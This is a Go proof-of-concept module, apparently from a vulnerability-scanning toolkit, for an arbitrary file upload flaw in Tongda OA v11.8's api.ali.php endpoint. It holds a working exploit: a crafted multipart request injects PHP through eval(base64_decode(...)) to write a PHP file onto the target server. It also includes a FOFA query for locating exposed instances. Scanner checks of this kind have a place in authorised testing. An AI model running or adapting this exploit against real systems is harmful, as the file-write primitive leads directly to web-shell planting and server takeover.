package main

import (
	"errors"
	"fmt"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA_v11.8_api.ali_任意文件上传漏洞",
			Author:   "ExpLang",
			Describe: "通达OA_v11.8_api.ali_存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器",
			Date:     "2023-09-26",
			Tags:     []string{"通达OA", "TongdaOA", "File_Upload", "任意文件上传"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 构建请求体
	requestBody := `--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
Content-Type: application/octet-stream

{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
--502f67681799b07e4de6b503655f5cae--`

	requestOption := &httpclient.RequestOptions{
		Method: http.MethodPost,
		URL:    Target + "/mobile/api/api.ali.php",
		Headers: map[string]string{
			"User-Agent":      httpclient.RandomUserAgent(),
			"Content-Type":    "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae",
			"Content-Length":  fmt.Sprintf("%d", len(requestBody)),
			"Accept-Encoding": "gzip",
		},
		ProxyURL:    ProxyURL,
		RequestBody: []byte(requestBody),
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOption)
	Httprecord[requestOption] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("第一个请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK && len(responseOption.Body) > 100 {
		fmt.Println("漏洞存在")
		return true, nil
	}

	return false, nil
}
